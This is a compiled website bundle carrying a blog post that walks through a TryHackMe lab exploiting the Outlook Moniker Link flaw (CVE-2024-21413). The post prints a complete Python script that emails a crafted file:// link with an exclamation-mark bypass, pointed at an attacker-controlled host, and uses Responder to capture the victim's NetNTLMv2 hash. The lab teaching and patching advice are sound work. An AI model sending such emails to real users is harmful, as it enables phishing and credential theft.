"use strict";(globalThis.webpackChunkmy_website=globalThis.webpackChunkmy_website||[]).push([[8211],{3534:(e,t,i)=>{i.r(t),i.d(t,{assets:()=>l,contentTitle:()=>a,default:()=>d,frontMatter:()=>o,metadata:()=>n,toc:()=>c});var n=i(3541),s=i(4848),r=i(8453);const o={slug:"moniker-link-writeup",title:"Moniker Link (CVE-2024-21413) Exploit Write-Up",authors:["paigehai"],tags:["write up","vulnerabilities","tools"],date:new Date("2025-06-20T00:00:00.000Z")},a=void 0,l={authorsImageUrls:[void 0]},c=[{value:"1. Introduction",id:"1-introduction",level:3},{value:"1.1 Scope",id:"11-scope",level:4},{value:"2. Creation of Exploit Python File",id:"2-creation-of-exploit-python-file",level:3},{value:"Tools Used",id:"tools-used",level:4},{value:"3. Setting Up the Attack",id:"3-setting-up-the-attack",level:3},{value:"Tools Used",id:"tools-used-1",level:4},{value:"4. Executing the Attack",id:"4-executing-the-attack",level:3},{value:"Tools Used",id:"tools-used-2",level:4},{value:"5. Conclusion",id:"5-conclusion",level:3}];function h(e){const t={a:"a",br:"br",code:"code",h3:"h3",h4:"h4",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)("div",{style:{textAlign:"center"},children:(0,s.jsx)("img",{src:"/blog/moniker-thumb.png",alt:"Moniker Link Thumbnail",style:{width:"100%",maxWidth:"500px",height:"auto"}})}),"\n",(0,s.jsx)(t.p,{children:"This writeup demonstrates how to exploit the Moniker Link vulnerability responsible for RCE and credential leak vulnerabilities."}),"\n",(0,s.jsx)(t.h3,{id:"1-introduction",children:"1. Introduction"}),"\n",(0,s.jsxs)(t.p,{children:["This writeup comes from the TryHackMe ",(0,s.jsx)(t.a,{href:"https://tryhackme.com/room/monikerlink",children:"Moniker Link (CVE-2024-21413)"})," room, where I demonstrate how to exploit a machine with the CVE-2024-21413 vulnerability."]}),"\n",(0,s.jsx)(t.p,{children:"This vulnerability has been noted alongside the following details:"}),"\n",(0,s.jsxs)(t.table,{children:[(0,s.jsx)(t.thead,{children:(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.th,{children:(0,s.jsx)(t.strong,{children:"Field"})}),(0,s.jsx)(t.th,{children:(0,s.jsx)(t.strong,{children:"Details"})})]})}),(0,s.jsxs)(t.tbody,{children:[(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.td,{children:(0,s.jsx)(t.strong,{children:"CNA"})}),(0,s.jsx)(t.td,{children:"Microsoft Corporation"})]}),(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.td,{children:(0,s.jsx)(t.strong,{children:"Published"})}),(0,s.jsx)(t.td,{children:"2024-02-13"})]}),(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.td,{children:(0,s.jsx)(t.strong,{children:"Updated"})}),(0,s.jsx)(t.td,{children:"2025-05-03"})]}),(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.td,{children:(0,s.jsx)(t.strong,{children:"Title"})}),(0,s.jsx)(t.td,{children:"Microsoft Outlook Remote Code Execution Vulnerability"})]}),(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.td,{children:(0,s.jsx)(t.strong,{children:"Description"})}),(0,s.jsx)(t.td,{children:"Microsoft Outlook Remote Code Execution Vulnerability"})]}),(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.td,{children:(0,s.jsx)(t.strong,{children:"CWE ID"})}),(0,s.jsx)(t.td,{children:"CWE-20: Improper Input Validation"})]}),(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.td,{children:(0,s.jsx)(t.strong,{children:"CVSS Score"})}),(0,s.jsx)(t.td,{children:"9.8 (CRITICAL)"})]}),(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.td,{children:(0,s.jsx)(t.strong,{children:"CVSS Vector"})}),(0,s.jsx)(t.td,{children:(0,s.jsx)(t.code,{children:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C"})})]}),(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.td,{children:(0,s.jsx)(t.strong,{children:"Affected Products"})}),(0,s.jsx)(t.td,{children:(0,s.jsxs)("ul",{children:[(0,s.jsxs)("li",{children:[(0,s.jsx)("strong",{children:"Microsoft Office 2019"})," on 32-bit and x64 systems: from 19.0.0 before ",(0,s.jsx)("a",{href:"https://aka.ms/OfficeSecurityReleases",children:"Security Releases"})]}),(0,s.jsxs)("li",{children:[(0,s.jsx)("strong",{children:"Microsoft 365 Apps for Enterprise"})," on 32-bit and x64 systems: from 16.0.1 before ",(0,s.jsx)("a",{href:"https://aka.ms/OfficeSecurityReleases",children:"Security Releases"})]}),(0,s.jsxs)("li",{children:[(0,s.jsx)("strong",{children:"Microsoft Office LTSC 2021"})," on 32-bit and x64 systems: from 16.0.1 before ",(0,s.jsx)("a",{href:"https://aka.ms/OfficeSecurityReleases",children:"Security Releases"})]}),(0,s.jsxs)("li",{children:[(0,s.jsx)("strong",{children:"Microsoft Office 2016"})," on 32-bit and x64 systems: from 16.0.0 before 16.0.5435.1001"]})]})})]})]})]}),"\n",(0,s.jsxs)(t.p,{children:["Outlook renders its emails using Hyper Text Markup Language (HTML), which is a standard language for structuring and displaying content. This ensures that Outlook is able to interpret and display HTML elements, including hyperlinks that use protocols including HTTP and HTTPs. With this, another mechanism is able to be parsed by Outlook, and this mechanism is known as a ",(0,s.jsx)(t.strong,{children:"Moniker Link"}),"."]}),"\n",(0,s.jsx)(t.p,{children:"These are unique URLs that leverage Windows COM (Component Object Model) monikers, where objects are used to dynamically reference resources or invoke unwelcome actions. When these links are embedded in emails, they can be created in such a way that invoke local or remote resources in malicious ways. In the vulnerable version of Outlook that I will be using in this demonstration, a Moniker Link can be exploited to trigger the automatic loading of malicious content, potentially leading to Remote Code Execution (RCE) without user interaction."}),"\n",(0,s.jsxs)(t.p,{children:["Outlook does implement a security feature that prompts a message when external applications are triggered, and is called ",(0,s.jsx)(t.strong,{children:"Protected View"}),". This feature opens emails that contain items such as attachments, hyperlinks, or similar type of content in read-only mode. This allows Outlook to block actions such as macros."]}),"\n",(0,s.jsxs)(t.p,{children:["In this walkthrough, I will be using ",(0,s.jsx)(t.code,{children:"file://"})," as the Moniker Link in the malicious hyperlink. As Outlook will block the typical Moniker Link",(0,s.jsx)(t.br,{}),"\n",(0,s.jsx)(t.code,{children:'<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>'}),", I will instead adjust the link to include an ",(0,s.jsx)(t.strong,{children:"exclamation mark"}),", which is a special character that can bypass Outlook's Protected View. When updated, the Moniker Link becomes",(0,s.jsx)(t.br,{}),"\n",(0,s.jsx)(t.code,{children:'<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>'}),". Notice the placement of the special character."]}),"\n",(0,s.jsx)(t.h4,{id:"11-scope",children:"1.1 Scope"}),"\n",(0,s.jsxs)(t.p,{children:["\u2022 Creation of Exploit Python File",(0,s.jsx)(t.br,{}),"\n","\u2022 Setting Up the Attack",(0,s.jsx)(t.br,{}),"\n","\u2022 Executing the Exploit"]}),"\n",(0,s.jsx)(t.h3,{id:"2-creation-of-exploit-python-file",children:"2. Creation of Exploit Python File"}),"\n",(0,s.jsx)(t.h4,{id:"tools-used",children:"Tools Used"}),"\n",(0,s.jsxs)(t.p,{children:["\u2022 ",(0,s.jsx)(t.strong,{children:"nano"}),": a tool that is used to edit files and scripts from the terminal"]}),"\n",(0,s.jsxs)(t.p,{children:["This investigation start with the use of a victim machine and an attacker machine. A script titled ",(0,s.jsx)(t.code,{children:"exploit.py"})," was created, as provided by TryHackMe."]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{children:'\'\'\'\r\nAuthor: CMNatic | https://github.com/cmnatic\r\nVersion: 1.0 | 19/02/2024\r\n\'\'\'\r\n\r\nimport smtplib\r\nfrom email.mime.text import MIMEText\r\nfrom email.mime.multipart import MIMEMultipart\r\nfrom email.utils import formataddr\r\n\r\nsender_email = \'attacker@monikerlink.thm\' # Replace with your sender email address\r\nreceiver_email = \'victim@monikerlink.thm\' # Replace with the recipient email address\r\npassword = input("Enter your attacker email password: ")\r\nhtml_content = """\\\r\n<!DOCTYPE html>\r\n<html lang="en">\r\n    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>\r\n\r\n    </body>\r\n</html>"""\r\n\r\nmessage = MIMEMultipart()\r\nmessage[\'Subject\'] = "CVE-2024-21413"\r\nmessage["From"] = formataddr((\'CMNatic\', sender_email))\r\nmessage["To"] = receiver_email\r\n\r\n# Convert the HTML string into bytes and attach it to the message object\r\nmsgHtml = MIMEText(html_content,\'html\')\r\nmessage.attach(msgHtml)\r\n\r\nserver = smtplib.SMTP(\'MAILSERVER\', 25)\r\nserver.ehlo()\r\ntry:\r\n    server.login(sender_email, password)\r\nexcept Exception as err:\r\n    print(err)\r\n    exit(-1)\r\n\r\ntry:\r\n    server.sendmail(sender_email, [receiver_email], message.as_string())\r\n    print("\\n Email delivered")\r\nexcept Exception as error:\r\n    print(error)\r\nfinally:\r\n    server.quit()\n'})}),"\n",(0,s.jsxs)(t.p,{children:["It is important to adjust the ",(0,s.jsx)(t.code,{children:"ATTACKER_MACHINE"})," and ",(0,s.jsx)(t.code,{children:"MAILSERVER"}),". In this investigation, I replaced ",(0,s.jsx)(t.code,{children:"ATTACKER_MACHINE"})," with my attacker IP address ",(0,s.jsx)(t.strong,{children:"10.10.90.151"}),", and ",(0,s.jsx)(t.code,{children:"MAILSERVER"})," with the server IP address generated by TryHackMe, ",(0,s.jsx)(t.strong,{children:"10.10.46.81"}),"."]}),"\n",(0,s.jsxs)(t.p,{children:["Once edited, I input the command ",(0,s.jsx)(t.code,{children:"nano exploit.py"}),"."]}),"\n",(0,s.jsx)("div",{className:"text--center margin-vert--lg",children:(0,s.jsx)("img",{src:"/blog/moniker-1.png",alt:"Moniker Link Writeup",className:"shadow--md",style:{maxWidth:"600px",width:"100%",height:"auto"}})}),"\n",(0,s.jsx)(t.p,{children:"In this new panel, I pasted the updated script. After this was completed, I saved this to the machine, ready for exploitation!"}),"\n",(0,s.jsx)("div",{className:"text--center margin-vert--lg",children:(0,s.jsx)("img",{src:"/blog/moniker-2.png",alt:"Moniker Link Writeup",className:"shadow--md",style:{maxWidth:"600px",width:"100%",height:"auto"}})}),"\n",(0,s.jsx)(t.h3,{id:"3-setting-up-the-attack",children:"3. Setting Up the Attack"}),"\n",(0,s.jsx)(t.h4,{id:"tools-used-1",children:"Tools Used"}),"\n",(0,s.jsxs)(t.p,{children:["\u2022 ",(0,s.jsx)(t.strong,{children:"responder"}),": a tool that can be used to capture and manipulate network authentication protocols",(0,s.jsx)(t.br,{}),"\n","\u2022 ",(0,s.jsx)(t.strong,{children:"Outlook"}),": an email application that allows a user to receive and send emails"]}),"\n",(0,s.jsx)(t.p,{children:"To execute this exploit, the victim machine runs a vulnerable version of Outlook."}),"\n",(0,s.jsx)("div",{className:"text--center margin-vert--lg",children:(0,s.jsx)("img",{src:"/blog/moniker-3.png",alt:"Moniker Link Writeup",className:"shadow--md",style:{maxWidth:"1000px",width:"100%",height:"auto"}})}),"\n",(0,s.jsxs)(t.p,{children:["I ran the responder tool utilising the command ",(0,s.jsx)(t.code,{children:"responder -I ens5"}),". Responder will be used in this investigation as it can be used to networking poisoning attacks, enabling it to harvest credentials. ",(0,s.jsx)(t.code,{children:"-I ens5"})," denotes the network interfact to listen from, which is ",(0,s.jsx)(t.strong,{children:"ens5"})," in my case."]}),"\n",(0,s.jsx)("div",{className:"text--center margin-vert--lg",children:(0,s.jsx)("img",{src:"/blog/moniker-4.png",alt:"Moniker Link Writeup",className:"shadow--md",style:{maxWidth:"700px",width:"100%",height:"auto"}})}),"\n",(0,s.jsx)(t.h3,{id:"4-executing-the-attack",children:"4. Executing the Attack"}),"\n",(0,s.jsx)(t.h4,{id:"tools-used-2",children:"Tools Used"}),"\n",(0,s.jsxs)(t.p,{children:["\u2022 ",(0,s.jsx)(t.strong,{children:"Outlook"}),(0,s.jsx)(t.br,{}),"\n","\u2022 ",(0,s.jsx)(t.strong,{children:"exploit.py"})]}),"\n",(0,s.jsxs)(t.p,{children:["In a new terminal, I executed my exploit script using the command ",(0,s.jsx)(t.code,{children:"python3 exploit.py"}),". When requested, I provided the password of the attacking email as per TryHackMe's website which is ",(0,s.jsx)(t.code,{children:"attacker"}),". I can see that this has been successful, as the program prints the message ",(0,s.jsx)(t.code,{children:"Email delivered"}),"."]}),"\n",(0,s.jsx)("div",{className:"text--center margin-vert--lg",children:(0,s.jsx)("img",{src:"/blog/moniker-5.png",alt:"Moniker Link Writeup",className:"shadow--md",style:{maxWidth:"600px",width:"100%",height:"auto"}})}),"\n",(0,s.jsxs)(t.p,{children:["Viewing this email in the victim machine, they have received a suspicious email with a link that says ",(0,s.jsx)(t.strong,{children:"Click me"}),". When clicked, an error is shown."]}),"\n",(0,s.jsx)("div",{className:"text--center margin-vert--lg",children:(0,s.jsx)("img",{src:"/blog/moniker-6.png",alt:"Moniker Link Writeup",className:"shadow--md",style:{maxWidth:"700px",width:"100%",height:"auto"}})}),"\n",(0,s.jsx)(t.p,{children:"Reviewing the responder results in the attacker machine, I am now able to observe the sensitive netNTLMv2 password hash of the victim."}),"\n",(0,s.jsx)("div",{className:"text--center margin-vert--lg",children:(0,s.jsx)("img",{src:"/blog/moniker-7.png",alt:"Moniker Link Writeup",className:"shadow--md",style:{maxWidth:"700px",width:"100%",height:"auto"}})}),"\n",(0,s.jsx)(t.h3,{id:"5-conclusion",children:"5. Conclusion"}),"\n",(0,s.jsxs)(t.p,{children:["In this demonstration, I highlight how an attacker may exploit ",(0,s.jsx)(t.strong,{children:"CVE-2024-21413"})," by crafting an email which contains a ",(0,s.jsx)(t.strong,{children:"moniker link"})," to obtain the users ",(0,s.jsx)(t.strong,{children:"NTMLv2"})," password hash from a vulnerable Outlook client. A python-based script is used alongside ",(0,s.jsx)(t.strong,{children:"responder"})," to listen for authentication attempts. In this simulation, the victim has been successfully tricked into initiating a connection with the malicious file path, which subsequently triggers automatic credential harvesting. The underlying behaviour in this version of Outlook, which is rendering and attempting to access the embedded ",(0,s.jsx)(t.code,{children:"file://"})," was sufficient to leak the users authentication data to my AttackBox. This demonstrates the inherent risk in client-sidew parsing of these types of crafted links and foregrounds the importance of security updates and disabling link resolution in email clients. In this controlled environment, this writeup has thoroughly illustrated how even with minimal user interaction, credentials can still be compromised and stolen. Reflecting on methods to mitigate these types of attacks, users can implement more secure configurations within email clients, and ensuring proactive patch management to effectively protect against vulnerabilities such as CVE-2024-21413."]})]})}function d(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,s.jsx)(t,{...e,children:(0,s.jsx)(h,{...e})}):h(e)}},3541:e=>{e.exports=JSON.parse('{"permalink":"/blog/moniker-link-writeup","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2025-06-20-moniker-link.md","source":"@site/blog/2025-06-20-moniker-link.md","title":"Moniker Link (CVE-2024-21413) Exploit Write-Up","description":"<img","date":"2025-06-20T00:00:00.000Z","tags":[{"inline":false,"label":"Write Up","permalink":"/blog/tags/write-up","description":"Write-ups and reports"},{"inline":false,"label":"Vulnerabilities","permalink":"/blog/tags/vulnerabilities","description":"Vulnerability reports"},{"inline":false,"label":"Tools","permalink":"/blog/tags/tools","description":"Forensic tools and utilities"}],"readingTime":6.71,"hasTruncateMarker":true,"authors":[{"name":"Paige Haines","title":"Cyber Security Analyst","url":"https://linkedin.com/in/paigehai","page":{"permalink":"/blog/authors/paigehai"},"socials":{"linkedin":"https://www.linkedin.com/in/paigehai/","github":"https://github.com/paigehai"},"imageURL":"https://github.com/paigehai.png","key":"paigehai"}],"frontMatter":{"slug":"moniker-link-writeup","title":"Moniker Link (CVE-2024-21413) Exploit Write-Up","authors":["paigehai"],"tags":["write up","vulnerabilities","tools"],"date":"2025-06-20T00:00:00.000Z"},"unlisted":false,"prevItem":{"title":"A Guide to John the Ripper","permalink":"/blog/jtr-guide"},"nextItem":{"title":"A Cheat Sheet on How to Create Your Own GitHub Pages Portfolio","permalink":"/blog/github-pages-guide"}}')},8453:(e,t,i)=>{i.d(t,{R:()=>o,x:()=>a});var n=i(6540);const s={},r=n.createContext(s);function o(e){const t=n.useContext(r);return n.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function a(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),n.createElement(r.Provider,{value:t},e.children)}}}]);